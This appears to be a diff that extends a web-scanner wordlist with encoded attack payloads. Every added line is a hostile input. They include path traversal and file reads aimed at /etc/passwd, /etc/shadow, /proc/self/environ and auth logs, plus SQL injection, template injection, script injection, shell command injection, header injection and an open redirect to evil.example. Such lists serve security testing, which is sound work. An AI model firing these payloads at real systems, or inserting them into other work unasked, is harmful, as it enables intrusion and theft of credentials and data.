@@ -78,3 +78,165 @@ lfi_2
 lfi_3
 /lfi/3
 /lfi/status%0a3
+../../../../../../etc/passwd%00
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500
+..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%252500
+../../../../../../ETC/PASSWD%00
+../../../../../../etc/passwd%00?aurose=1
+../../../../../../etc/passwd%00&aurose=1
+..%2f..%2f..%2f..%2fetc%2fshadow
+..%252f..%252f..%252f..%252fetc%252fshadow
+..%25252f..%25252f..%25252f..%25252fetc%25252fshadow
+..%2F..%2F..%2F..%2FETC%2FSHADOW
+..%2f..%2f..%2f..%2fetc%2fshadow?aurose=1
+..%2f..%2f..%2f..%2fetc%2fshadow&aurose=1
+..%252f..%252f..%252fetc%252fpasswd
+..%25252f..%25252f..%25252fetc%25252fpasswd
+..%2525252f..%2525252f..%2525252fetc%2525252fpasswd
+..%252F..%252F..%252FETC%252FPASSWD
+..%252f..%252f..%252fetc%252fpasswd?aurose=1
+..%252f..%252f..%252fetc%252fpasswd&aurose=1
+..\..\..\..\boot.ini
+..%5C..%5C..%5C..%5Cboot.ini
+..%255C..%255C..%255C..%255Cboot.ini
+..\..\..\..\BOOT.INI
+..\..\..\..\boot.ini?aurose=1
+..\..\..\..\boot.ini&aurose=1
+/proc/self/environ
+%2Fproc%2Fself%2Fenviron
+%252Fproc%252Fself%252Fenviron
+/PROC/SELF/ENVIRON
+/proc/self/environ?aurose=1
+/proc/self/environ&aurose=1
+/proc/self/environ.bak
+/proc/self/environ.old
+/proc/self/cmdline
+%2Fproc%2Fself%2Fcmdline
+%252Fproc%252Fself%252Fcmdline
+/PROC/SELF/CMDLINE
+/proc/self/cmdline?aurose=1
+/proc/self/cmdline&aurose=1
+/proc/self/cmdline.bak
+/proc/self/cmdline.old
+/etc/hosts
+%2Fetc%2Fhosts
+%252Fetc%252Fhosts
+/ETC/HOSTS
+/etc/hosts?aurose=1
+/etc/hosts&aurose=1
+/etc/hosts.bak
+/etc/hosts.old
+/var/log/auth.log
+%2Fvar%2Flog%2Fauth.log
+%252Fvar%252Flog%252Fauth.log
+/VAR/LOG/AUTH.LOG
+/var/log/auth.log?aurose=1
+/var/log/auth.log&aurose=1
+/var/log/auth.log.bak
+/var/log/auth.log.old
+/windows/system32/drivers/etc/hosts
+%2Fwindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts
+%252Fwindows%252Fsystem32%252Fdrivers%252Fetc%252Fhosts
+/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS
+/windows/system32/drivers/etc/hosts?aurose=1
+/windows/system32/drivers/etc/hosts&aurose=1
+/windows/system32/drivers/etc/hosts.bak
+/windows/system32/drivers/etc/hosts.old
+../../../../../../etc/passwd#
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%23
+..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2523
+../../../../../../ETC/PASSWD#
+../../../../../../etc/passwd#?aurose=1
+../../../../../../etc/passwd#&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+../../../../../../etc/passwd%00::var0
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500::v0
+/lfi/probe/0
+..%2f..%2f..%2f..%2fetc%2fshadow::var1
+..%252f..%252f..%252f..%252fetc%252fshadow::v1
+/lfi/probe/1
+..%252f..%252f..%252fetc%252fpasswd::var2
+..%25252f..%25252f..%25252fetc%25252fpasswd::v2
+/lfi/probe/2
+..\..\..\..\boot.ini::var3
+..%5C..%5C..%5C..%5Cboot.ini::v3
+/lfi/probe/3
+/proc/self/environ::var4
+%2Fproc%2Fself%2Fenviron::v4
+/lfi/probe/4
